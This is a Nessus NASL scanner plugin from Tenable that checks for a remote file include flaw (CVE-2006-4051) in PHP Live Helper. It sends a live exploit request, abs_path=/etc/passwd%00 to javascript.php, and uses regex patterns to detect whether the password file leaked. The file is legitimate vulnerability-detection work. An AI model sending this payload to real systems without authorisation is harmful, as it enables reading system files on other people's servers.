#
# (C) Tenable Network Security
#


if (description)
{
  script_id(21159);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2006-4051");
  # also formerly BID 17266.
  script_bugtraq_id(18509, 19349);

  script_name(english:"PHP Live Helper Multiple Remote File Include Vulnerabilities");
  script_summary(english:"Tries to read /etc/passwd using PHP Live Helper");

  desc = "
Synopsis :

The remote web server contains a PHP application that is affected by
several remote file include flaws. 

Description :

The remote host is running PHP Help Live, a commercial web-based
real-time help tool written using PHP and MySQL. 

The version of PHP Help Live installed on the remote host fails to
sanitize input to the 'abs_path' parameter before using it in various
scripts to include files with PHP code.  An unauthenticated attacker
may be able to exploit these issues to view arbitrary files or to
execute arbitrary PHP code, possibly taken from third-party hosts. 

See also :

http://www.securityfocus.com/archive/1/428976/30/0/threaded
http://www.securityfocus.com/archive/1/437648/30/0/threaded
http://www.securityfocus.com/archive/1/442219/30/0/threaded

Solution :

Unknown at this time.

Risk factor :

High / CVSS Base Score : 7 
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/phplivehelper", "/livehelp", "/help", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to exploit one of the flaws to read a file.
  file = "/etc/passwd%00";
  req = http_get(
    item:string(
      dir, "/javascript.php?",
      "abs_path=", file
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access and/or remote file inclusion might still work.
    egrep(pattern:"main\(/etc/passwd\\0global\.php.+ failed to open stream", string:res) ||
    egrep(pattern:"Failed opening '/etc/passwd\\0global\.php'", string:res) ||
    # we get an error claiming the file doesn't exist or...
    egrep(pattern:"main\(/etc/passwd[^)]*\): failed to open stream: No such file or directory", string:res) ||
    # we get an error about open_basedir restriction or...
    egrep(pattern:"main.+ open_basedir restriction in effect. File \(/etc/passwd", string:res)
  )
  {
    security_hole(port);
    exit(0);
  }
}
